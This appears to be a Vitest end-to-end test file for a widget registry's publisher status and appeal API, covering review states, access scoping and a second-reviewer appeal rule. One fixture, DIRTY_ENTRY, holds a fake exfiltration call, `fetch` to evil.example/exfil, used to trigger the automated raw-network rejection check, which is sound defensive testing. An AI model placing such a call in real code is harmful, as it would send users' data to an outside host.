/**
 * Publisher-facing artifact status + appeal API (#47, FR-11) end to end: the
 * surface `gridmason publish` polls and `gridmason appeal` calls, over the HTTP
 * server with `inject()`, in-memory stores, and a live FakeIssuer.
 *
 * Covers: status for each review state (reviewing / approved / human-rejected /
 * automated-rejected) with findings keyed by the shared `@gridmason/cli/checks`
 * check ids; owner-scoping (unauthenticated → 401, a different registered
 * publisher and an unknown id → 404, an unregistered identity → 403); the appeal
 * happy path and its second-reviewer rule; appeal on a non-rejected artifact;
 * appeal authorization; and an explicit contract-parity check that our responses
 * parse under a replica of the CLI's `parseRecord` / `parseFindings`
 * (cli PR #63, `src/publish/upload.ts`).
 */
import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, it } from 'vitest';

import { InMemoryArtifactStore } from '../../src/artifact/store.js';
import type { AuditEvent } from '../../src/audit/index.js';
import { noopAuditSink, setAuditSink } from '../../src/audit/index.js';
import { createOidcVerifier } from '../../src/auth/oidc.js';
import { loadConfig } from '../../src/config/index.js';
import { createLogger } from '../../src/logging/index.js';
import { composeOidcIdentity } from '../../src/publisher/types.js';
import { InMemoryPublisherStore } from '../../src/publisher/store.js';
import { InMemoryReleaseDocStore } from '../../src/release/store.js';
import { InMemoryReviewCaseStore } from '../../src/review/store.js';
import { buildServer } from '../../src/server.js';
import { InMemoryObjectStore } from '../../src/storage/object-store.js';
import { startFakeIssuer, type FakeIssuer } from '../helpers/oidc-issuer.js';

const REGISTRY_ID = 'registry.test';
const FUTURE = Math.floor(Date.now() / 1000) + 3600;
const AUTHOR_SUB = 'author-1';
const OTHER_SUB = 'other-pub-1';
const REVIEWER1_SUB = 'reviewer-1';
const REVIEWER2_SUB = 'reviewer-2';
const UNREGISTERED_SUB = 'nobody-1';

const b64 = (value: string): string => Buffer.from(value).toString('base64');
const b64json = (value: unknown): string => b64(JSON.stringify(value));

const validEnvelope = {
  payloadType: 'application/vnd.gridmason.artifact+json',
  payload: b64('{"tag":"acme-clock"}'),
  signatures: [{ sig: 'MEUCIQ', keyid: 'oidc' }],
};

const manifest = {
  formatVersion: '1.0',
  tag: 'acme-clock',
  kind: 'widget',
  name: 'Acme Clock',
  publisher: 'acme',
  version: '1.2.0',
  entry: 'entry.js',
};

const CLEAN_ENTRY = 'export default class extends HTMLElement {}';
// A raw `fetch(` outside the SDK reliably fails the shared `sdk.raw-network`
// check, so this upload is auto-rejected by the automated stage.
const DIRTY_ENTRY = "const x = await fetch('https://evil.example/exfil'); export default class extends HTMLElement {}";

function uploadBody(entry: string, version = '1.2.0'): Record<string, unknown> {
  return {
    tag: 'acme-clock',
    version,
    files: [
      { path: 'manifest.json', role: 'manifest', bytes: b64json({ ...manifest, version }) },
      { path: 'entry.js', role: 'entry', bytes: b64(entry) },
    ],
    sourceArchive: b64('source-tarball'),
    envelope: validEnvelope,
  };
}

const auth = (token: string): Record<string, string> => ({ authorization: `Bearer ${token}` });

// ---------------------------------------------------------------------------
// A faithful replica of the CLI's response parsers (cli PR #63, upload.ts), so a
// parity test asserts our wire shapes are exactly what `gridmason publish` reads.
interface CliRecord {
  id: string;
  tag: string;
  version: string;
  state: string;
  registryId?: string;
  contentHashes?: Record<string, string>;
  createdAt?: string;
}
function isObj(v: unknown): v is Record<string, unknown> {
  return typeof v === 'object' && v !== null && !Array.isArray(v);
}
function cliParseRecord(body: unknown): CliRecord | null {
  if (!isObj(body)) return null;
  const { id, tag, version, state } = body;
  if (typeof id !== 'string' || typeof tag !== 'string' || typeof version !== 'string' || typeof state !== 'string') {
    return null;
  }
  return {
    id,
    tag,
    version,
    state,
    ...(typeof body.registryId === 'string' ? { registryId: body.registryId } : {}),
    ...(isObj(body.contentHashes) ? { contentHashes: body.contentHashes as Record<string, string> } : {}),
    ...(typeof body.createdAt === 'string' ? { createdAt: body.createdAt } : {}),
  };
}
function cliParseFindings(review: unknown): { checkId: string; detail: string; status?: string }[] {
  if (!isObj(review)) return [];
  const out: { checkId: string; detail: string; status?: string }[] = [];
  if (Array.isArray(review.findings)) {
    for (const f of review.findings) {
      if (isObj(f) && typeof f.checkId === 'string' && typeof f.detail === 'string') {
        out.push({ checkId: f.checkId, detail: f.detail });
      }
    }
  }
  if (Array.isArray(review.results)) {
    for (const r of review.results) {
      if (isObj(r) && typeof r.id === 'string' && typeof r.message === 'string') {
        const status = r.status === 'fail' || r.status === 'warn' || r.status === 'pass' ? r.status : undefined;
        if (status === 'pass') continue;
        out.push({ checkId: r.id, detail: r.message, ...(status ? { status } : {}) });
      }
    }
  }
  return out;
}
// ---------------------------------------------------------------------------

describe('publisher artifact status + appeal API', () => {
  let issuer: FakeIssuer;
  let authorToken: string;
  let otherToken: string;
  let reviewer1Token: string;
  let reviewer2Token: string;
  let unregisteredToken: string;
  let reviewer1Id: string;
  let reviewer2Id: string;
  let logger: ReturnType<typeof createLogger>;
  let audit: AuditEvent[];

  beforeAll(async () => {
    issuer = await startFakeIssuer();
    authorToken = await issuer.sign({ iss: issuer.issuer, sub: AUTHOR_SUB, exp: FUTURE });
    otherToken = await issuer.sign({ iss: issuer.issuer, sub: OTHER_SUB, exp: FUTURE });
    reviewer1Token = await issuer.sign({ iss: issuer.issuer, sub: REVIEWER1_SUB, exp: FUTURE });
    reviewer2Token = await issuer.sign({ iss: issuer.issuer, sub: REVIEWER2_SUB, exp: FUTURE });
    unregisteredToken = await issuer.sign({ iss: issuer.issuer, sub: UNREGISTERED_SUB, exp: FUTURE });
    reviewer1Id = composeOidcIdentity(issuer.issuer, REVIEWER1_SUB);
    reviewer2Id = composeOidcIdentity(issuer.issuer, REVIEWER2_SUB);
    logger = createLogger(loadConfig({ LOG_LEVEL: 'silent', REGISTRY_ID }));
  });

  afterAll(async () => {
    await issuer.close();
  });

  beforeEach(() => {
    audit = [];
    setAuditSink({ emit: (event) => audit.push(event) });
  });

  afterEach(() => {
    setAuditSink(noopAuditSink);
  });

  /** A fresh app: the author owns `acme`, a second publisher owns `beta`, two reviewers. */
  async function makeApp() {
    const publisherStore = new InMemoryPublisherStore();
    await publisherStore.register({ issuer: issuer.issuer, subject: AUTHOR_SUB, prefix: 'acme', tier: 'operator' });
    await publisherStore.register({ issuer: issuer.issuer, subject: OTHER_SUB, prefix: 'beta', tier: 'verified' });
    const artifactStore = new InMemoryArtifactStore();
    const reviewCaseStore = new InMemoryReviewCaseStore();
    const config = loadConfig({
      LOG_LEVEL: 'silent',
      REGISTRY_ID,
      REVIEW_REVIEWER_IDENTITIES: [reviewer1Id, reviewer2Id].join(','),
    });
    const app = await buildServer({
      config,
      logger,
      publisherStore,
      artifactStore,
      objectStore: new InMemoryObjectStore(),
      reviewCaseStore,
      // A release-doc store mounts the hash-addressed serving origin
      // (`GET /v1/artifacts/:hash`) alongside the status route
      // (`GET /v1/artifacts/:id/status`), so this app proves the two coexist.
      releaseDocStore: new InMemoryReleaseDocStore(),
      oidcVerifier: createOidcVerifier({ issuerAllowlist: [issuer.issuer] }),
    });
    return { app, artifactStore, reviewCaseStore };
  }

  type App = Awaited<ReturnType<typeof buildServer>>;

  const publish = (app: App, entry = CLEAN_ENTRY, version = '1.2.0') =>
    app.inject({ method: 'POST', url: '/v1/artifacts', headers: auth(authorToken), payload: uploadBody(entry, version) });

  const getStatus = (app: App, id: string, token: string) =>
    app.inject({ method: 'GET', url: `/v1/artifacts/${id}/status`, headers: auth(token) });

  const appeal = (app: App, id: string, token: string) =>
    app.inject({ method: 'POST', url: `/v1/artifacts/${id}/appeal`, headers: auth(token), payload: {} });

  const submitVerdict = (app: App, caseId: string, token: string, body: unknown) =>
    app.inject({
      method: 'POST',
      url: `/v1/review/cases/${caseId}/verdict`,
      headers: auth(token),
      payload: body as Record<string, unknown>,
    });

  // --- Status ---------------------------------------------------------------

  it('reports a reviewing artifact with no findings, source-qualified', async () => {
    const { app } = await makeApp();
    const id = (await publish(app)).json().id as string;

    const res = await getStatus(app, id, authorToken);
    expect(res.statusCode).toBe(200);
    const body = res.json();
    expect(body).toMatchObject({ id, registryId: REGISTRY_ID, tag: 'acme-clock', version: '1.2.0', state: 'reviewing' });
    // A clean, undecided artifact surfaces no `review` object.
    expect(body.review).toBeUndefined();
    await app.close();
  });

  it('reports an approved artifact', async () => {
    const { app, reviewCaseStore } = await makeApp();
    const id = (await publish(app)).json().id as string;
    const caseId = (await reviewCaseStore.findByArtifact(id))!.id;
    await submitVerdict(app, caseId, reviewer1Token, { decision: 'approve', findings: [] });

    const body = (await getStatus(app, id, authorToken)).json();
    expect(body.state).toBe('approved');
    expect(body.review).toBeUndefined();
    await app.close();
  });

  it('reports a human rejection with findings keyed by check ids', async () => {
    const { app, reviewCaseStore } = await makeApp();
    const id = (await publish(app)).json().id as string;
    const caseId = (await reviewCaseStore.findByArtifact(id))!.id;
    await submitVerdict(app, caseId, reviewer1Token, {
      decision: 'reject',
      findings: [
        { checkId: 'manifest.schema', detail: 'schema drift' },
        { checkId: 'manual', detail: 'undisclosed telemetry' },
      ],
    });

    const body = (await getStatus(app, id, authorToken)).json();
    expect(body.state).toBe('rejected');
    expect(body.review.findings).toEqual([
      { checkId: 'manifest.schema', detail: 'schema drift' },
      { checkId: 'manual', detail: 'undisclosed telemetry' },
    ]);
    await app.close();
  });

  it('reports an automated rejection with the failing check results', async () => {
    const { app } = await makeApp();
    const published = await publish(app, DIRTY_ENTRY);
    // Automated review rejects the raw-network upload synchronously on upload.
    expect(published.json().state).toBe('rejected');
    const id = published.json().id as string;

    const body = (await getStatus(app, id, authorToken)).json();
    expect(body.state).toBe('rejected');
    // The non-pass automated results are surfaced, keyed by shared check ids.
    const results = body.review.results as { id: string; status: string; message: string }[];
    expect(results.length).toBeGreaterThan(0);
    expect(results.some((r) => r.id === 'sdk.raw-network' && r.status === 'fail')).toBe(true);
    // No `pass` result leaks into the surfaced set.
    expect(results.every((r) => r.status !== 'pass')).toBe(true);
    await app.close();
  });

  it('coexists with the hash-addressed serving origin (distinct routes)', async () => {
    const { app } = await makeApp();
    const id = (await publish(app)).json().id as string;

    // The status route responds for the owner…
    const status = await getStatus(app, id, authorToken);
    expect(status.statusCode).toBe(200);

    // …and the frozen serving origin `GET /v1/artifacts/:hash` still mounts on the
    // same app (an unreleased hash is refused `404 unknown_hash`, proving the route
    // exists and did not collide with the status route).
    const serving = await app.inject({ method: 'GET', url: '/v1/artifacts/sha2-256:deadbeef' });
    expect(serving.statusCode).toBe(404);
    expect(serving.json().error.code).toBe('unknown_hash');
    await app.close();
  });

  // --- Status authorization -------------------------------------------------

  it('rejects an unauthenticated status read with 401', async () => {
    const { app } = await makeApp();
    const id = (await publish(app)).json().id as string;
    const res = await app.inject({ method: 'GET', url: `/v1/artifacts/${id}/status` });
    expect(res.statusCode).toBe(401);
    expect(res.json().error.code).toBe('missing_token');
    await app.close();
  });

  it('answers 404 for another publisher and for an unknown id (no enumeration oracle)', async () => {
    const { app } = await makeApp();
    const id = (await publish(app)).json().id as string;

    const other = await getStatus(app, id, otherToken);
    expect(other.statusCode).toBe(404);
    expect(other.json().error.code).toBe('not_found');

    const unknown = await getStatus(app, 'art-does-not-exist', authorToken);
    expect(unknown.statusCode).toBe(404);
    await app.close();
  });

  it('answers 403 not_registered for a verified identity with no publisher record', async () => {
    const { app } = await makeApp();
    const id = (await publish(app)).json().id as string;
    const res = await getStatus(app, id, unregisteredToken);
    expect(res.statusCode).toBe(403);
    expect(res.json().error.code).toBe('not_registered');
    await app.close();
  });

  // --- Appeal ---------------------------------------------------------------

  it('appeals a rejection: re-opens to reviewing, excludes the original reviewer, a second reviewer decides', async () => {
    const { app, artifactStore, reviewCaseStore } = await makeApp();
    const id = (await publish(app)).json().id as string;
    const rejectedCaseId = (await reviewCaseStore.findByArtifact(id))!.id;
    await submitVerdict(app, rejectedCaseId, reviewer1Token, {
      decision: 'reject',
      findings: [{ checkId: 'manual', detail: 'policy' }],
    });
    expect((await artifactStore.findById(id))?.state).toBe('rejected');

    const appealed = await appeal(app, id, authorToken);
    expect(appealed.statusCode).toBe(201);
    expect(appealed.json()).toMatchObject({ id, state: 'reviewing' });
    expect(audit).toContainEqual(expect.objectContaining({ action: 'artifact.appeal', subject: id }));

    // The re-opened case is the newest for the artifact and excludes reviewer-1.
    const appealCaseId = (await reviewCaseStore.findByArtifact(id))!.id;
    expect(appealCaseId).not.toBe(rejectedCaseId);

    // The original reviewer cannot decide the appeal…
    const refused = await submitVerdict(app, appealCaseId, reviewer1Token, { decision: 'approve', findings: [] });
    expect(refused.statusCode).toBe(403);
    expect(refused.json().error.code).toBe('appeal_reviewer_forbidden');

    // …a second reviewer can.
    const decided = await submitVerdict(app, appealCaseId, reviewer2Token, { decision: 'approve', findings: [] });
    expect(decided.statusCode).toBe(201);
    expect(decided.json().artifactState).toBe('approved');
    await app.close();
  });

  it('refuses to appeal an artifact that is not rejected (409 not_appealable)', async () => {
    const { app } = await makeApp();
    const id = (await publish(app)).json().id as string; // still `reviewing`
    const res = await appeal(app, id, authorToken);
    expect(res.statusCode).toBe(409);
    expect(res.json().error.code).toBe('not_appealable');
    await app.close();
  });

  it('scopes appeal to the owner: 401 unauthenticated, 404 for another publisher', async () => {
    const { app, reviewCaseStore } = await makeApp();
    const id = (await publish(app)).json().id as string;
    const caseId = (await reviewCaseStore.findByArtifact(id))!.id;
    await submitVerdict(app, caseId, reviewer1Token, { decision: 'reject', findings: [{ checkId: 'manual', detail: 'x' }] });

    const unauth = await app.inject({ method: 'POST', url: `/v1/artifacts/${id}/appeal`, payload: {} });
    expect(unauth.statusCode).toBe(401);

    const other = await appeal(app, id, otherToken);
    expect(other.statusCode).toBe(404);
    await app.close();
  });

  // --- Contract parity with the CLI's parsers -------------------------------

  it('produces wire shapes the CLI parseRecord/parseFindings read (automated + human)', async () => {
    const { app, reviewCaseStore } = await makeApp();

    // Automated rejection → `review.results`.
    const autoId = (await publish(app, DIRTY_ENTRY, '2.0.0')).json().id as string;
    const autoBody = (await getStatus(app, autoId, authorToken)).json();
    const autoRecord = cliParseRecord(autoBody);
    expect(autoRecord).not.toBeNull();
    expect(autoRecord).toMatchObject({ id: autoId, tag: 'acme-clock', version: '2.0.0', state: 'rejected', registryId: REGISTRY_ID });
    const autoFindings = cliParseFindings(autoBody.review);
    expect(autoFindings.some((f) => f.checkId === 'sdk.raw-network' && f.status === 'fail')).toBe(true);

    // Human rejection → `review.findings`.
    const humanId = (await publish(app, CLEAN_ENTRY, '3.0.0')).json().id as string;
    const humanCaseId = (await reviewCaseStore.findByArtifact(humanId))!.id;
    await submitVerdict(app, humanCaseId, reviewer1Token, {
      decision: 'reject',
      findings: [{ checkId: 'manual', detail: 'hand-made judgement' }],
    });
    const humanBody = (await getStatus(app, humanId, authorToken)).json();
    expect(cliParseRecord(humanBody)).toMatchObject({ id: humanId, state: 'rejected' });
    expect(cliParseFindings(humanBody.review)).toEqual([{ checkId: 'manual', detail: 'hand-made judgement' }]);
    await app.close();
  });
});
